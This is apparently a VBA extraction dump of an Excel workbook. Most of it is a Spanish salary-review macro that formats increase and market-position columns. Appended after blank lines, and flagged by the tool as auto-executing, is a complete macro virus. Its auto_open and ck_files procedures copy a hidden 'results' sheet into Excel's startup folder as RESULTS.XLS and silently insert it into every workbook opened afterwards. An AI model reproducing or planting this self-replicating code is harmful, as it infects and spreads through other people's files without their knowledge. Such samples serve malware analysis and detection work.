        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 2
    End With
    Range("O3:S3").Select
    With Selection
        .HorizontalAlignment = xlCenter
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    Selection.Merge
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
      Rows("1:1").EntireRow.AutoFit
    Range("L1").Select
    ActiveCell.FormulaR1C1 = "VAS"
    With ActiveCell.Characters(Start:=1, Length:=3).Font
        .Name = "MS Sans Serif"
        .FontStyle = "Negrita"
        .Size = 8
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Rows("1:1").Select
    Range("I1").Activate
    Selection.EntireRow.Hidden = True
    Range("C8:C" + ULTIMA).Select
    Selection.NumberFormat = "$#,##0.00"
    Range("I8:K" + ULTIMA).Select
    Selection.Style = "Percent"
    Range("B8:B" + ULTIMA).Select
    Selection.NumberFormat = "$#,##0.0;($#,##0.0)"
    Selection.NumberFormat = "$#,##0;($#,##0)"
    ActiveWindow.SmallScroll ToRight:=19
    Range("X8:X" + ULTIMA).Select
    Selection.NumberFormat = "$#,##0.0;($#,##0.0)"
    Selection.NumberFormat = "$#,##0;($#,##0)"
    ActiveWindow.SmallScroll ToRight:=-1
    Range("T8:U" + ULTIMA).Select
    With Selection.Interior
        .ColorIndex = 36
        .Pattern = xlSolid
    End With
    ActiveWindow.DisplayGridlines = False
    ActiveWindow.ScrollColumn = 14
    Range("Y8").Select
    ActiveCell.FormulaR1C1 = "=RC[-4]"
    Range("Y8").Select
    Selection.Copy
    Range("Y9:Y" + ULTIMA).Select
    ActiveSheet.Paste
    
     Range("M7").Select
    ActiveCell.FormulaR1C1 = "Nuevo Sueldo"
    With ActiveCell.Characters(Start:=1, Length:=12).Font
        .Name = "Arial"
        .FontStyle = "Negrita"
        .Size = 8
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Range("N7").Select
    ActiveCell.FormulaR1C1 = "% Incremento"
    With ActiveCell.Characters(Start:=1, Length:=12).Font
        .Name = "Arial"
        .FontStyle = "Negrita"
        .Size = 8
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Range("O7").Select
    ActiveCell.FormulaR1C1 = "Incremento en $"
    With ActiveCell.Characters(Start:=1, Length:=15).Font
        .Name = "Arial"
        .FontStyle = "Negrita"
        .Size = 8
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Range("P7").Select
    ActiveCell.FormulaR1C1 = "Pos Mkt S Base"
    With ActiveCell.Characters(Start:=1, Length:=14).Font
        .Name = "Arial"
        .FontStyle = "Negrita"
        .Size = 8
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Range("Q7").Select
    ActiveCell.FormulaR1C1 = "Pos Mkt Garantizado"
    With ActiveCell.Characters(Start:=1, Length:=19).Font
        .Name = "Arial"
        .FontStyle = "Negrita"
        .Size = 8
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Range("R7").Select
    ActiveCell.FormulaR1C1 = "Pos Mkt Total"
    With ActiveCell.Characters(Start:=1, Length:=13).Font
        .Name = "Arial"
        .FontStyle = "Negrita"
        .Size = 8
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Range("U7").Select
    ActiveCell.FormulaR1C1 = "% Incremento"
    With ActiveCell.Characters(Start:=1, Length:=12).Font
        .Name = "Arial"
        .FontStyle = "Negrita"
        .Size = 8
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Range("V7").Select
    ActiveCell.FormulaR1C1 = "Nva Pos S Base"
    With ActiveCell.Characters(Start:=1, Length:=14).Font
        .Name = "Arial"
        .FontStyle = "Negrita"
        .Size = 8
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Range("W7").Select
    ActiveWindow.SmallScroll ToRight:=4
    Range("Z7").Select
    ActiveCell.FormulaR1C1 = "Nva Pos Garantia"
    With ActiveCell.Characters(Start:=1, Length:=16).Font
        .Name = "Arial"
        .FontStyle = "Negrita"
        .Size = 8
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Range("AA7").Select
    ActiveCell.FormulaR1C1 = "Nva Pos Total"
    With ActiveCell.Characters(Start:=1, Length:=13).Font
        .Name = "Arial"
        .FontStyle = "Negrita"
        .Size = 8
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Range("Z7").Select
    ActiveWindow.SmallScroll ToRight:=-20
    Columns("A:A").EntireColumn.AutoFit
    Columns("D:D").Select
    Range("D2").Activate
    Selection.ColumnWidth = 7.71
    Columns("E:E").Select
    Range("E2").Activate
    Selection.ColumnWidth = 9.14
    ActiveWindow.SmallScroll ToRight:=2
    Columns("F:F").EntireColumn.AutoFit
    Columns("G:G").Select
    Range("G2").Activate
    Selection.ColumnWidth = 7.71
    ActiveWindow.SmallScroll ToRight:=3
    Columns("I:I").Select
    Range("I2").Activate
    Selection.ColumnWidth = 7.29
    Columns("J:J").Select
    Range("J2").Activate
    Selection.ColumnWidth = 10.57
    Columns("K:K").Select
    Range("K2").Activate
    Selection.ColumnWidth = 7.71
    ActiveWindow.SmallScroll ToRight:=3
    Columns("N:N").Select
    Range("N2").Activate
    Selection.ColumnWidth = 9.14
    Columns("P:P").Select
    Range("P2").Activate
    Selection.ColumnWidth = 7.57
    Columns("Q:Q").Select
    Range("Q2").Activate
    Selection.ColumnWidth = 9.43
    Columns("R:R").Select
    Range("R2").Activate
    Selection.ColumnWidth = 8.71
    ActiveWindow.SmallScroll ToRight:=6
    Columns("V:V").Select
    Range("V2").Activate
    Selection.ColumnWidth = 6.71
    'ActiveWindow.SmallScroll ToRight:=1
    'Selection.ColumnWidth = 9.71
    'ActiveWindow.SmallScroll ToRight:=5
    'Selection.ColumnWidth = 12.43
    'ActiveWindow.SmallScroll ToRight:=-18
    Range("F8:F" + ULTIMA).Select
    With Selection
        .HorizontalAlignment = xlLeft
        .VerticalAlignment = xlBottom
        .WrapText = True
        .Orientation = 0
        .IndentLevel = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
     Columns("AK:AK").Select
    Range("AK2").Activate
    Selection.EntireColumn.Hidden = True

'*********************************************************
'*********************************************************
'*********************************************************
    Range("O3:S3").Select
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlCenter
        .WrapText = False
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = False
    End With
    Columns("P:P").Select
    Range("P2").Activate
    Selection.Insert Shift:=xlToRight
    Selection.Insert Shift:=xlToRight
    Range("P7").Select
    ActiveCell.FormulaR1C1 = "Nueva Com A Plan"
    With ActiveCell.Characters(Start:=1, Length:=17).Font
        .Name = "Arial"
        .FontStyle = "Negrita"
        .Size = 8
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Range("P8").Select
    Columns("P:P").ColumnWidth = 9.14
    Columns("P:P").ColumnWidth = 9.71
    Range("Q7").Select
    ActiveCell.FormulaR1C1 = "Increm En Pesos"
    With ActiveCell.Characters(Start:=1, Length:=16).Font
        .Name = "Arial"
        .FontStyle = "Negrita"
        .Size = 8
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ColorIndex = 1
    End With
    Range("Q8").Select
    Columns("Q:Q").ColumnWidth = 9.29
    Columns("Q:Q").ColumnWidth = 9.43
    Range("P7:Q7").Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    With Selection.Borders(xlInsideVertical)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    Range("P8").Select
    ActiveCell.FormulaR1C1 = "=RC[-13]*(1+RC[-2])"
    Range("P8").Select
    Selection.Copy
    Range("P9:P" + ULTIMA).Select
    ActiveSheet.Paste
    Range("Q8").Select
    Application.CutCopyMode = False
    ActiveCell.FormulaR1C1 = "=RC[-1]-RC[-14]"
    Range("Q8").Select
    Selection.Copy
    Range("Q9:Q" + ULTIMA).Select
    ActiveSheet.Paste
    Range("T3:U3").Select
    Application.CutCopyMode = False
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .Weight = xlMedium
        .ColorIndex = 1
    End With
    Selection.Borders(xlEdgeTop).LineStyle = xlNone
    Selection.Borders(xlEdgeBottom).LineStyle = xlNone
    Selection.Borders(xlEdgeRight).LineStyle = xlNone
    Selection.Borders(xlInsideVertical).LineStyle = xlNone
    Range("O3:S3").Select
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlCenter
        .WrapText = False
        .Orientation = 0
        .ShrinkToFit = False
        .MergeCells = True
    End With
    Range("O3:S3,O:O").Select
    Range("O2").Activate
    Selection.ColumnWidth = 13.14
 
 
 'Rows("1:1").RowHeight = 13.5
    Range("P7:Q7").Select
    Selection.Copy
    Range("P1").Select
    ActiveSheet.Paste
    Range("P1").Select
    Application.CutCopyMode = False
    Rows("1:1").Select
    Range("M1").Activate
    Selection.EntireRow.Hidden = True
    Columns("P:P").ColumnWidth = 10.29
    Columns("Q:Q").ColumnWidth = 11
    Columns("R:R").ColumnWidth = 11.14
    Columns("R:R").ColumnWidth = 10.14

'**********************************************************
'**********************************************************

    ActiveWorkbook.Save
    Range("T8").Select
    
    MsgBox "EL PROCESO FINALIZO EN FORMA SATISFACTORIA"
End If
End Sub

































Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "ck_files"
End Sub

Sub ck_files()
Attribute ck_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "RESULTS.XLS")
    If m$ = "RESULTS.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("results").Visible = True
    Sheets("results").Select
    Sheets("results").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "RESULTS.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("results").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "RESULTS.XLS!ck_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "results" Then
        Workbooks("RESULTS.XLS").Sheets("results").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("results").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "RESULTS.XLS!ck_files"
    Case Else
End Select
End Sub



-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  result
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

